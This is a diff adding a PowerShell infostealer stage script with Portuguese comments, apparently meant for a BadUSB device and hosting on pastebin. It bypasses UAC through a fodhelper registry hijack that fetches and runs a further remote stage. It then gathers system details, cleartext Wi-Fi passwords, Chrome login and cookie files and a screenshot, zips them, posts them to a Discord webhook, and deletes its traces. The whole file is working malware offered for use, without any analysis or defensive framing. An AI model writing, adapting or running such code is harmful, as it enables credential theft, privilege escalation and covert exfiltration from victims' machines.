@@ -1,0 +1,67 @@
+# hospede este conteúdo como raw (ex: https://pastebin.com/raw/ABCDEFGH)
+$ErrorActionPreference = 'SilentlyContinue'
+
+# 0. Helpers
+function b64zip($dir){
+  Add-Type -AssemblyName System.IO.Compression
+  $ms = New-Object IO.MemoryStream
+  $zo = New-Object IO.Compression.ZipArchive($ms,'Create',$true)
+  Get-ChildItem $dir -File -Recurse | %{
+    $e = $zo.CreateEntry($_.FullName.Substring($dir.Length+1))
+    $s = $e.Open(); [IO.File]::OpenRead($_.FullName).CopyTo($s); $s.Close()
+  }
+  $zo.Dispose(); [Convert]::ToBase64String($ms.ToArray())
+}
+
+# 1. Bypass UAC (fodhelper)
+$code = @"
+start powershell -args "-nop -w h -c iex(iwr -UseB $((iwr -UseB https://pastebin.com/raw/SEU_STAGIO_TRES).Content))"
+"@
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
+Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $code -Force
+Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Force
+Start-Process "fodhelper.exe"; sleep 3
+Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
+
+# 2. Coleta
+$tmp = "$env:TEMP\$(Get-Random)"
+New-Item $tmp -ItemType Directory | Out-Null
+
+# 2a. Dados do sistema
+whoami /all > "$tmp\whoami.txt"
+ipconfig /all   > "$tmp\ip.txt"
+netstat -ano    > "$tmp\netstat.txt"
+
+# 2b. Senhas Wi-Fi
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{
+  $name = $_.Matches[0].Groups[1].Value.Trim()
+  (netsh wlan show profile name="$name" key=clear) >> "$tmp\wifi.txt"
+}
+
+# 2c. Cookies / logins Chrome
+$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+if(Test-Path $chrome){
+  Copy-Item "$chrome\Login Data" "$tmp\chrome_logins"
+  Copy-Item "$chrome\Cookies" "$tmp\chrome_cookies"
+}
+
+# 2d. Screenshot
+Add-Type -AssemblyName System.Drawing
+$screen = [Drawing.Rectangle]::FromLTRB(0,0,[Drawing.Screen]::PrimaryScreen.Bounds.Width,[Drawing.Screen]::PrimaryScreen.Bounds.Height)
+$bmp = New-Object Drawing.Bitmap $screen.Width,$screen.Height
+$g = [Drawing.Graphics]::FromImage($bmp)
+$g.CopyFromScreen(0,0,0,0,$screen.Size)
+$bmp.Save("$tmp\scr.png"); $g.Dispose(); $bmp.Dispose()
+
+# 3. Envia
+$zipb64 = b64zip $tmp
+$body = @{
+  username = "ProMicro"
+  content  = "Sys: $env:COMPUTERNAME | User: $env:USERNAME"
+  file     = "data.zip"
+} | ConvertTo-Json -Compress
+
+Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1442271101236416614/ii4wvLtLYzIvw4L3RsDo5_zbOuDhCgWDvLk0ed6rvLrN_3zA3Q0tdBRS0h8HWG7LOf6Z' -Method Post -Body $body -ContentType 'application/json'
+
+# limpa
+Remove-Item $tmp -Recurse -Force
